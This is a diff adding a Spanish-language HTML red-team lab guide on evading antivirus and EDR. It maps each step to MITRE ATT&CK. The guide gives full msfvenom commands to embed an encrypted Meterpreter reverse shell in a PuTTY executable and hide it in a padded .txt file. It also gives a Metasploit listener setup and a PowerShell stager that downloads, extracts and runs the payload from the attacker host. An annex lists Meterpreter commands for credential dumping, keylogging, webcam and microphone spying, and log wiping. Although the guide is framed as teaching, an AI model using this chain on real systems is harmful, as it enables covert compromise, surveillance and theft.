@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Guía: Evasión Avanzada de Defensas (Red Team) | CRD</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/estilos.css">
+</head>
+<body>
+<main>
+ <div data-include="aviso-etico"></div>
+
+  <h1>✅ Guía de Laboratorio: Evasión Avanzada de Defensas (Red Team)</h1>
+
+  <p>
+    Este laboratorio demuestra cómo combinar técnicas de <strong>Binary Padding</strong>, <strong>Backdooring</strong>, <strong>Ofuscación</strong> y <strong>Ejecución Living-off-the-Land (LotL)</strong> para evadir sistemas de seguridad modernos como Antivirus y EDR (Endpoint Detection and Response).
+  </p>
+
+  <h2>🛡️ Mapeo de Tácticas y Técnicas (MITRE ATT&CK)</h2>
+  <p>A continuación se detallan las técnicas adversariales que se implementarán en este ejercicio:</p>
+  
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Táctica</th>
+        <th>Técnica</th>
+        <th>Código MITRE</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Ejecución</strong></td>
+        <td>Command and Scripting Interpreter: PowerShell</td>
+        <td><code>T1059.001</code></td>
+      </tr>
+      <tr>
+        <td><strong>Evasión de Defensas</strong></td>
+        <td>Obfuscated Files or Information: Binary Padding</td>
+        <td><code>T1027.001</code></td>
+      </tr>
+      <tr>
+        <td><strong>Evasión de Defensas</strong></td>
+        <td>Masquerading (Uso de Metadatos Legítimos)</td>
+        <td><code>T1036</code></td>
+      </tr>
+      <tr>
+        <td><strong>Evasión de Defensas</strong></td>
+        <td>Deobfuscate/Decode Files or Information</td>
+        <td><code>T1140</code></td>
+      </tr>
+      <tr>
+        <td><strong>Evasión de Defensas</strong></td>
+        <td>Obfuscated Files or Information (Cifrado AES/XOR)</td>
+        <td><code>T1027</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+
+  <hr>
+
+   <h2>🏗️ Escenario y Arquitectura de Red</h2>
+  <div style="text-align: center;">
+    <img src="assets/img/ACL-meta.png" alt="Arquitectura de Red del Laboratorio" style="max-width: 100%; height: auto; border: 1px solid #ccc; border-radius: 8px;">
+  </div>
+  
+  <p>Para que el laboratorio sea exitoso, es fundamental configurar el entorno virtual de la siguiente manera:</p>
+  <ul>
+    <li><strong>Segmento de Red:</strong> Ambas máquinas (Atacante y Víctima) deben estar conectadas al switch virtual <strong>VMnet1 (Host-only)</strong>.</li>
+    <li><strong>Subred:</strong> El laboratorio está diseñado para operar como ejemplo en el rango <strong>192.168.80.0/24</strong></li>
+    <li><strong>Servicio DHCP:</strong> En la aplicación <em>Virtual Network Editor</em> de tu máquina física, asegurate de tener marcada la opción <strong>"Use local DHCP service to distribute IP address to VMs"</strong>.</li>
+    <li><strong>Verificación:</strong> 
+      <ul>
+        <li>En <strong>Kali</strong>, usá <i>ifconfig</i> para verificar tu IP.</li>
+        <li>En <strong>Windows</strong>, usá <i>ipconfig</i> en el CMD.</li>
+      </ul>
+    </li>
+  </ul>
+
+  <h2>💀 FASE 1: Preparación en Kali Linux (Atacante)</h2>
+  
+  <h3>1. Creación del archivo de inflado (Binary Padding)</h3>
+  <pre><code>dd if=/dev/zero of=fat_file bs=1M count=2048</code></pre>
+  <ul>
+    <li><strong>Explicación:</strong> Crea un archivo de 2 GB lleno de ceros.</li>
+    <li><strong>Objetivo técnico:</strong> Evadir escaneos de AV y Sandboxes que omiten archivos pesados para no degradar el rendimiento del sistema (MITRE T1027.001).</li>
+  </ul>
+
+  <h3>2. Creación de la cabecera (Offset)</h3>
+  <pre><code>python3 -c "print('A'*736, end='')" > head_file.txt</code></pre>
+  <ul>
+    <li><strong>Explicación:</strong> Crea un archivo de texto de exactamente 736 bytes.</li>
+    <li><strong>Objetivo técnico:</strong> Sirve como "colchón" inicial para desplazar los bytes mágicos del ejecutable, engañando al análisis estático inicial.</li>
+  </ul>
+
+ <h3>3. Generación del Malware (Backdooring e Inyección)</h3>
+  
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>⚠️ Requisito previo obligatorio:</strong> 
+    Para que este paso funcione, necesitás el archivo de plantilla PuTTY original. 
+    <br><br>
+    1. <strong>Descargá el archivo desde aquí:</strong> 
+    <a href="assets/img/putty-68-64.exe" download style="font-weight: bold; color: #c70303;">📥 Descargar putty-68-64.exe</a>
+    <br>
+    2. <strong>Ubicación:</strong> Copiá el archivo descargado y pegalo <u>dentro de la misma carpeta</u> donde tenés abierta la terminal de Kali (ej: ~/Lab05).
+  </div>
+
+  <p>Una vez que el archivo "putty-68-64.exe" esté en tu carpeta, edita del siguiente comando la parte "<i><b>LHOST=192.168.44.130</i></b>" que tiene que ser la IP del atacante (Kali) y luego ejecutá el siguiente comando:</p>
+
+
+  
+  <pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.44.130 LPORT=8443 EXITFUNC=thread -f exe -a x64 --platform windows -x putty-68-64.exe -i 10 --encoder x64/xor_dynamic --encrypt aes256 --encrypt-key S3C4135huhbksdA -o mi_m4lw4r3.exe</code></pre>
+  
+  <ul>
+    <li><strong>-x putty-68-64.exe:</strong> Indica a msfvenom que use este programa como "mula" para inyectar el código y heredar sus metadatos (**Masquerading**).</li>
+    <li><strong>-i 10:</strong> Aplica el codificador XOR 10 veces para intentar evadir firmas estáticas simples.</li>
+    <li><strong>--encrypt aes256:</strong> Aplica una capa de cifrado adicional al payload para ocultar las funciones maliciosas.</li>
+  </ul>
+
+  <h3>4. Ensamblaje Final (Concatenación)</h3>
+  <pre><code>cat head_file.txt mi_m4lw4r3.exe fat_file > archivo_inocente.txt</code></pre>
+  <ul>
+    <li>Esto crea un nuevo archivo con la siguiente estructura: <strong>[Texto Inútil (736b)] + [Malware Cifrado] + [2GB de Ceros]</strong></li>
+  </ul>
+
+  <h3>5. Entrega y Recepción (C2 Setup)</h3>
+  <p><strong>Terminal 1 (Servidor Web):</strong></p>
+  <p>Levantar un servidor web donde se encuentra los archivos</p>
+  <pre><code>python3 -m http.server 8000</code></pre>
+  <p><strong>Terminal 2 (Listener Metasploit):</strong></p>
+  
+
+  <p>Edita del siguiente comando la parte "<i><b>LHOST=192.168.44.130</i></b>" que tiene que ser la IP del atacante (Kali)</p>
+  <pre><code>msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.44.130; set LPORT 8443; exploit"</code></pre>
+
+  <hr>
+
+  <h2>🎯 FASE 2: Ejecución en Windows 11 (Víctima)</h2>
+  <h3>6. El Stager de PowerShell (One-Liner)</h3>
+  <p>Editar el "http://<b><i>192.168.44.130</i></b>:8000/archivo_inocente.txt" y coloca la IP del atacante (Kali)</p>
+  <p>Ejecutar en una terminal de PowerShell:</p>
+  <pre><code>Set-Variable ProgressPreference SilentlyContinue; iwr http://192.168.44.130:8000/archivo_inocente.txt -o "$PWD\archivo_inocente.txt"; $i="$PWD\archivo_inocente.txt"; $o=Join-Path $PWD ([IO.Path]::GetRandomFileName().Replace('.','')+'.exe'); $a=[IO.File]::OpenRead($i); $b=[IO.File]::Create($o); $a.Seek(736,'Begin')>$null; $a.CopyTo($b); $a.Close(); $b.Close(); saps $o</code></pre>
+  
+  <p><strong>Análisis del comando:</strong></p>
+  <ol>
+    <li><code>iwr</code>: Descarga el contenedor de 2GB.</li>
+    <li><code>GetRandomFileName()</code>: Genera un nombre aleatorio (ej: <code>m3dppziodbe.exe</code>) para evadir firmas de nombre.</li>
+    <li><code>$a.Seek(736,'Begin')</code>: Salta el texto inicial e identifica el inicio del malware oculto.</li>
+    <li><code>$a.CopyTo($b)</code>: Extrae el malware real al disco.</li>
+    <li><code>saps</code>: Ejecuta el proceso inyectado.</li>
+  </ol>
+
+  <hr>
+
+  <h2>📊 Resumen de Técnicas MITRE ATT&CK</h2>
+  <ul>
+    <li><strong>T1027.001 - Binary Padding:</strong> Inflado de archivo a 2GB.</li>
+    <li><strong>T1036 - Masquerading:</strong> Uso de metadatos de PuTTY.</li>
+    <li><strong>T1059.001 - PowerShell:</strong> Ejecución mediante Living-off-the-Land (LotL).</li>
+    <li><strong>T1140 - Deobfuscate/Decode Files:</strong> Extracción manual mediante offsets.</li>
+    <li><strong>T1027 - Obfuscated Files:</strong> Cifrado AES y XOR dinámico.</li>
+  </ul>
+
+  <hr>
+
+  <hr>
+
+  <h2>📂 Anexo: Diccionario Completo de Comandos Meterpreter</h2>
+  <p>A continuación, se detallan los comandos disponibles en la sesión de Meterpreter tras la explotación exitosa, organizados por su funcionalidad técnica.</p>
+
+  <h3>1. Core Commands (Gestión de Sesión)</h3>
+  <table border="1" cellpadding="6">
+    <thead>
+      <tr>
+        <th>Comando</th>
+        <th>Descripción</th>
+        <th>Ejemplo de Uso</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>background</code></td>
+        <td>Envía la sesión actual al fondo para volver a la consola de Metasploit.</td>
+        <td><code>meterpreter > background</code></td>
+      </tr>
+      <tr>
+        <td><code>migrate</code></td>
+        <td>Mueve el proceso del malware a otro proceso activo en el sistema.</td>
+        <td><code>migrate 1520</code> (Migra al PID 1520, ej. explorer.exe)</td>
+      </tr>
+      <tr>
+        <td><code>load / use</code></td>
+        <td>Carga extensiones de Meterpreter (ej. kiwi para contraseñas).</td>
+        <td><code>load kiwi</code></td>
+      </tr>
+      <tr>
+        <td><code>sessions</code></td>
+        <td>Permite cambiar rápidamente entre diferentes sesiones activas.</td>
+        <td><code>sessions -i 2</code></td>
+      </tr>
+      <tr>
+        <td><code>exit / quit</code></td>
+        <td>Termina la sesión de Meterpreter actual.</td>
+        <td><code>meterpreter > exit</code></td>
+      </tr>
+      <tr>
+        <td><code>sleep</code></td>
+        <td>Fuerza a la sesión a entrar en reposo y reconectarse después de X segundos.</td>
+        <td><code>sleep 30</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>2. Priv: Elevate, Password & Timestomp (Privilegios)</h3>
+  <table border="1" cellpadding="6">
+    <thead>
+      <tr>
+        <th>Comando</th>
+        <th>Descripción</th>
+        <th>Ejemplo de Uso</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>getsystem</code></td>
+        <td>Intenta elevar privilegios al nivel de SYSTEM (el nivel más alto).</td>
+        <td><code>meterpreter > getsystem</code></td>
+      </tr>
+      <tr>
+        <td><code>hashdump</code></td>
+        <td>Extrae los hashes de las contraseñas de la base de datos SAM.</td>
+        <td><code>meterpreter > hashdump</code></td>
+      </tr>
+      <tr>
+        <td><code>timestomp</code></td>
+        <td>Modifica los atributos de fecha (MACE) de un archivo para confundir forenses.</td>
+        <td><code>timestomp virus.exe -v</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>3. Stdapi: File System (Gestión de Archivos)</h3>
+  <table border="1" cellpadding="6">
+    <thead>
+      <tr>
+        <th>Comando</th>
+        <th>Descripción</th>
+        <th>Ejemplo de Uso</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>ls / dir</code></td>
+        <td>Lista archivos y carpetas en el directorio actual.</td>
+        <td><code>ls C:\Users\Public</code></td>
+      </tr>
+      <tr>
+        <td><code>cd / pwd</code></td>
+        <td>Navega entre carpetas y muestra la ruta actual.</td>
+        <td><code>cd Documents</code></td>
+      </tr>
+      <tr>
+        <td><code>download</code></td>
+        <td>Descarga un archivo o directorio de la víctima a tu Kali.</td>
+        <td><code>download "facturas.pdf"</code></td>
+      </tr>
+      <tr>
+        <td><code>upload</code></td>
+        <td>Sube un archivo de tu Kali a la máquina víctima.</td>
+        <td><code>upload nc.exe C:\Windows\Temp</code></td>
+      </tr>
+      <tr>
+        <td><code>cat / edit</code></td>
+        <td>Lee el contenido de un archivo en pantalla o permite editarlo.</td>
+        <td><code>cat notas.txt</code></td>
+      </tr>
+      <tr>
+        <td><code>search</code></td>
+        <td>Busca archivos en todo el sistema de la víctima.</td>
+        <td><code>search -f *.config</code></td>
+      </tr>
+      <tr>
+        <td><code>rm / del</code></td>
+        <td>Elimina el archivo especificado.</td>
+        <td><code>del evidencia.log</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>4. Stdapi: Networking & System (Red y Sistema)</h3>
+  <table border="1" cellpadding="6">
+    <thead>
+      <tr>
+        <th>Comando</th>
+        <th>Descripción</th>
+        <th>Ejemplo de Uso</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>ipconfig / ifconfig</code></td>
+        <td>Muestra las interfaces de red y direcciones IP de la víctima.</td>
+        <td><code>meterpreter > ipconfig</code></td>
+      </tr>
+      <tr>
+        <td><code>netstat</code></td>
+        <td>Muestra las conexiones de red activas de la víctima.</td>
+        <td><code>meterpreter > netstat</code></td>
+      </tr>
+      <tr>
+        <td><code>portfwd</code></td>
+        <td>Reenvía un puerto local a un servicio remoto (Pivoting).</td>
+        <td><code>portfwd add -l 3389 -p 3389 -r 127.0.0.1</code></td>
+      </tr>
+      <tr>
+        <td><code>ps</code></td>
+        <td>Lista todos los procesos en ejecución.</td>
+        <td><code>meterpreter > ps</code></td>
+      </tr>
+      <tr>
+        <td><code>getuid / getpid</code></td>
+        <td>Muestra el usuario actual y el ID del proceso del malware.</td>
+        <td><code>meterpreter > getuid</code></td>
+      </tr>
+      <tr>
+        <td><code>shell</code></td>
+        <td>Abre una terminal de comandos (CMD) de Windows.</td>
+        <td><code>meterpreter > shell</code></td>
+      </tr>
+      <tr>
+        <td><code>clearev</code></td>
+        <td>Borra los registros de eventos de Windows (Logs).</td>
+        <td><code>meterpreter > clearev</code></td>
+      </tr>
+      <tr>
+        <td><code>execute</code></td>
+        <td>Ejecuta un programa en la víctima (puede ser oculto).</td>
+        <td><code>execute -f calc.exe</code></td>
+      </tr>
+      <tr>
+        <td><code>shutdown / reboot</code></td>
+        <td>Apaga o reinicia la computadora remota.</td>
+        <td><code>meterpreter > reboot</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>5. Stdapi: User Interface & Webcam (Espionaje)</h3>
+  <table border="1" cellpadding="6">
+    <thead>
+      <tr>
+        <th>Comando</th>
+        <th>Descripción</th>
+        <th>Ejemplo de Uso</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>screenshot</code></td>
+        <td>Captura una imagen del escritorio del usuario.</td>
+        <td><code>meterpreter > screenshot</code></td>
+      </tr>
+      <tr>
+        <td><code>screenshare</code></td>
+        <td>Mira el escritorio remoto en tiempo real (streaming).</td>
+        <td><code>meterpreter > screenshare</code></td>
+      </tr>
+      <tr>
+        <td><code>keyscan_start / stop</code></td>
+        <td>Inicia o detiene la captura de teclas (Keylogger).</td>
+        <td><code>meterpreter > keyscan_start</code></td>
+      </tr>
+      <tr>
+        <td><code>keyscan_dump</code></td>
+        <td>Muestra lo que el usuario ha escrito mientras el escáner estaba activo.</td>
+        <td><code>meterpreter > keyscan_dump</code></td>
+      </tr>
+      <tr>
+        <td><code>idletime</code></td>
+        <td>Muestra cuánto tiempo lleva el usuario sin tocar la PC.</td>
+        <td><code>meterpreter > idletime</code></td>
+      </tr>
+      <tr>
+        <td><code>webcam_list</code></td>
+        <td>Muestra las cámaras disponibles en la víctima.</td>
+        <td><code>meterpreter > webcam_list</code></td>
+      </tr>
+      <tr>
+        <td><code>webcam_snap / stream</code></td>
+        <td>Toma una foto o transmite video de la webcam.</td>
+        <td><code>meterpreter > webcam_stream</code></td>
+      </tr>
+      <tr>
+        <td><code>record_mic</code></td>
+        <td>Graba audio del micrófono por X segundos.</td>
+        <td><code>record_mic -d 10</code> (Graba 10 segundos)</td>
+      </tr>
+      <tr>
+        <td><code>play</code></td>
+        <td>Reproduce un archivo de audio .wav en la PC víctima.</td>
+        <td><code>play "mensaje.wav"</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>💡 Lecciones Aprendidas</h2>
+  <ul>
+    <li><strong>Evasión por Tamaño:</strong> El inflado de archivos (2GB) es efectivo contra escaneos estáticos automáticos, pero no contra el análisis de comportamiento.</li>
+    <li><strong>Detección Heurística:</strong> Windows Defender puede detectar un "ShellcodeRunner" mediante <strong>AMSI</strong> incluso si el archivo está cifrado, al analizar la actividad en la memoria RAM.</li>
+    <li><strong>Firma Digital:</strong> El Masquerading engaña al ojo humano, pero el sistema detecta la falta de una firma digital válida en el archivo modificado.</li>
+    <li><strong>Poder de PowerShell:</strong> La capacidad de manipular archivos mediante clases de .NET permite realizar extracciones complejas sin herramientas externas.</li>
+  </ul>
+
+  <hr>
+
+  <h2>📚 Referencias</h2>
+  <ul>
+    <li>MITRE ATT&CK Matrix: <a href="https://attack.mitre.org/" target="_blank">https://attack.mitre.org/</a></li>
+    <li>Metasploit Documentation: <a href="https://docs.metasploit.com/" target="_blank">https://docs.metasploit.com/</a></li>
+    <li>Microsoft AMSI (Antimalware Scan Interface): <a href="https://learn.microsoft.com/en-us/windows/win32/amsi/" target="_blank">Documentación Oficial</a></li>
+  </ul>
+
+<section>
+  <h2>Ejercicios de Control</h2>
+  <div class="iframe-wrapper">
+    <!-- Reemplazar con el link real de tu H5P en Lumi o Moodle -->
+    <iframe src="https://app.lumi.education/api/v1/run/TU_CODIGO_AQUI/embed" width="1088" height="400" frameborder="0" allowfullscreen="allowfullscreen"></iframe>
+  </div>
+</section>
+
+<form id="form-reportar" class="form-horizontal">
+  <input type="hidden" id="titulo" name="titulo" value="Evasión Avanzada de Defensas">
+  <input type="hidden" id="archivo" name="archivo" value="guia_redteam_evasion.html">
+  <input type="hidden" id="fecha" name="fecha">
+  <textarea id="comentario" name="comentario" placeholder="¿Tuviste problemas con la detección de AMSI o el comando msfvenom? Escribí aquí." required></textarea>
+  <button type="submit">Enviar Reporte</button>
+</form>
+
+<div id="mensaje-envio" style="margin-top:10px; color: green;"></div>
+
+</main>
+<div data-include="footer"></div>
+<script src="assets/js/scripts.js"></script>
+</body>
+</html>
